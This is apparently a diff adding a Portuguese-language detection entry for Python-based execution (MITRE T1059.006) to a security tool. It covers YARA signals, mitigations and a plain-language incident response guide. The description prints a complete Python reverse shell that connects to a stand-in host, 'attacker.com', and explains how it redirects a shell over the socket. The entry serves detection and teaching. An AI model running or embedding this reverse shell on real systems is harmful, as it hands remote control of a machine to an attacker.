@@ -1,0 +1,70 @@
+id: T1059.006
+name: Command and Scripting Interpreter - Python
+tactic: Execution (Execução)
+url: https://attack.mitre.org/techniques/T1059/006/
+severity: high
+description: |
+  Atacante usa Python pra executar payloads. Vantagem do Python pro
+  atacante: vem pré-instalado em quase todo Linux server (sysadmins
+  o usam pra automação), tem stdlib rica (socket, subprocess, os) e
+  permite codigo legível que ainda assim viola a maquina facilmente.
+
+  Reverse shell em Python — padrão clássico:
+
+    import socket, subprocess, os
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect(("attacker.com", 4444))
+    os.dup2(s.fileno(), 0)
+    os.dup2(s.fileno(), 1)
+    os.dup2(s.fileno(), 2)
+    subprocess.call(["/bin/sh", "-i"])
+
+  Por que funciona: socket abre canal TCP de saída pro atacante (passa
+  por firewalls inbound), os.dup2 redireciona stdin/stdout/stderr pro
+  socket, subprocess executa /bin/sh interativo. Atacante digita comandos
+  na máquina dele e roda na sua.
+
+detection:
+  rules:
+    - yara_critical_match
+    - yara_match_burst
+  signals: |
+    YARA match em .py files (especialmente em /tmp, /var/www) com
+    ReverseShellPython rule (socket + connect + subprocess|dup2).
+    Em vuln-lab tem template em /tmp/lab-bait/reverse_shell.py
+    (NÃO executado, só texto pro detector).
+
+mitigation:
+  - Python disponível só pra usuários que precisam (não pro web user)
+  - Egress firewall: bloquear conexões outbound de processos não-aprovados
+  - Auditd: registrar execve de python com argv (pega -c "..." inline)
+  - SELinux/AppArmor restringindo o que httpd_t/nginx_t podem chamar
+  - YARA scheduled scan + filewatcher em /tmp e /var/www
+
+references:
+  - https://attack.mitre.org/techniques/T1059/006/
+  - https://gtfobins.github.io/gtfobins/python/
+
+summary_simple:
+  what_happened: |
+    Encontramos um script Python que parece um "reverse shell" — código
+    que abre conexão pra um servidor do atacante e dá um terminal pra
+    ele comandar a máquina como se estivesse logado.
+  should_worry: |
+    Sério. Reverse shell quase nunca é legítimo — é a ferramenta padrão
+    pós-invasão pra atacante manter acesso depois de explorar uma falha.
+    Mesmo que o script em si não esteja rodando, ele estar lá já indica
+    que alguém com acesso ao servidor o plantou.
+  what_to_do:
+    - "Veja o conteúdo: cat <caminho-do-script>"
+    - "Veja quem o criou: stat <caminho-do-script> e ls -la"
+    - "Cheque processos rodando: ps aux | grep python"
+    - "Cheque conexões abertas: ss -tnp | grep python"
+    - "Cheque cron/systemd pra agendamento: crontab -l && systemctl list-units --type=service"
+    - SentinelBR já quarantinou o arquivo
+    - Considere snapshot da VM/container pra forense, depois reset do zero
+  jargon:
+    reverse shell: "Programa que ABRE conexão de SAÍDA pro atacante (em vez do contrário) — passa por firewalls inbound e dá um terminal remoto"
+    payload: "Código malicioso que o atacante quer rodar — reverse shell, miner, webshell, etc"
+    socket: "Mecanismo de comunicação entre programas via rede TCP/UDP"
+    dup2: "Função do sistema que faz um arquivo aberto (incluindo socket) virar entrada/saída padrão de outro programa"
